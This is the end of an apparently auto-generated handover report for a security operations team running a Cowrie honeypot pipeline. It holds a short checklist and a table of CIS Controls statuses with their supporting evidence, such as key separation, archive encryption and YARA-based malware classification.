- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-13T22:47:42Z_
